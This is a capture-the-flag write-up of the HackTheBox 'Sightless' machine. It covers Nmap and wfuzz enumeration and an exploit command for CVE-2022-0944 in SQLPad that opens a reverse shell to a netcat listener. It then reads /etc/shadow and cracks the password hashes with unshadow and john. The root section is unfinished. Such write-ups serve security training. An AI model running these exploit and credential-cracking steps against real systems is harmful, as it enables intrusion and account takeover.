---
title: Sightless - HackTheBox
authors: Samarth
date: 2024-12-01 16:30:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, FTPd, Web, CVE-2022-0944 ]
math: true
mermaid: true
---

![Cicada - HTB](/assets/images/writeups/Sightless-HTB/banner.png)

## TL;DR



## Scanning Network

I started with a Nmap scan and found ports 21, 22, and 80, corresponding to ProFTPD Server, OpenSSH and Nginx 1.18.0. Let's review the Nmap result.

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.32 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-15 15:23 IST
Nmap scan report for 10.10.11.32
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94%I=7%D=12/15%Time=675EA730%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Se
SF:rver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20tr
SF:y\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20
SF:being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I have discovered two services: SSH and HTTP. Let's begin by enumerating the HTTP service. Allow us to delve into the enumeration phase.

## Enumeration

I have observed that in Nmap scan, IP address gives us a reference to a domain name `sightless.htb`. So, we have to add this domain to `"/etc/hosts"` file.

Let's open [http://slightless.htb/]().

![Browser View](/assets/images/writeups/Sightless-HTB/1.png)

Let's initiate directory fuzzing to discover any potentially interesting directories or parameters.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://sightless.htb/FUZZ --hc 404,403
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sightless.htb/FUZZ
Total requests: 20116

=====================================================================
ID           Response   Lines    Word       Chars    Payload     
=====================================================================

000000002:   301        7 L      12 W       178 Ch   "images" 
000004255:   200        105 L    389 W      4993 Ch  "http://sightless.htb/"                                  
000006462:   301        7 L      12 W       178 Ch   "icones"  
```

I haven't found anything interesting while directory fuzzing. Let's browse the website and try to find some information.

While browsing the website, I have found one subdomain `sqlpad.sightless.htb`.

![Subdomain Browser View](/assets/images/writeups/Sightless-HTB/2.png)

Let's browse the SQLPad website and enumerate it to run SQL queries or find something interesting.

![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)

I have found `SQLPad` version as `6.10.0`. Let's browse Google and try to find exploit for this SQLPad version if any exists.

SQLPad version 6.10.0 is vulnerable to <b>[__`CVE-2022-0944`__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)</b>. 

## Exploitation

`CVE-2022-0944` - Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.

Let's use this exploit to perform template injection in new SQLPad query. 

```bash
python3 exploit.py http://sqlpad.sightless.htb/ <Listener IP> <Listener Port>
```

The above exploit requires target, listener IP address and listener port. Before using the above exploit, let's open netcat listener on port 4444. Exploit will send the query to the server and server initiate new connection along with payload and then send back the shell to netcat listener.

```bash
python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.70 4444
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```

Once the exploit sent to the server, let's check netcat listener if the shell is received or not.

![Netcat Listener](/assets/images/writeups/Sightless-HTB/4.png)


It's surprising to see the direct root access to the system. But while browsing directories, I have found `.dockerenv` which confirms that the application is running in a docker container.

![Docker Container](/assets/images/writeups/Sightless-HTB/5.png)

While inspecting system's user, I got two usernames `michael` and `node`. It seems that the application is running under some user contexts, which could provide opportunity to carry further exploitation.

### User Flag

As now I have access to some user, let's check `/etc/passwd` and `/etc/shadow` files and will crack the hash using `unshadow`.

Accessing `/etc/passwd`

![/etc/passwd](/assets/images/writeups/Sightless-HTB/6.png)

Accessing `/etc/shadow`

![/etc/shadow](/assets/images/writeups/Sightless-HTB/7.png)

I will be using `unshadow` tool to combine content of `/etc/passwd` and `/etc/shadow`.

```bash
unshadow passwd shadow > passwd_shadow_combined
```

![unshadow](/assets/images/writeups/Sightless-HTB/8.png)

Let's use `john` to crack the hash and find the password.

![Root's and Michael's Password](/assets/images/writeups/Sightless-HTB/9.png)

It's interesting to see that using `john`, I have cracked password for `root` as well as `michael`. I'm pretty sure that the password of root itself indicates that it's not that easy. 

Let's utilise the username as `michael` and use the above password to login using SSH.

![Michael shell](/assets/images/writeups/Sightless-HTB/10.png)


### Root Flag (Post Exploitation)

To be continued......








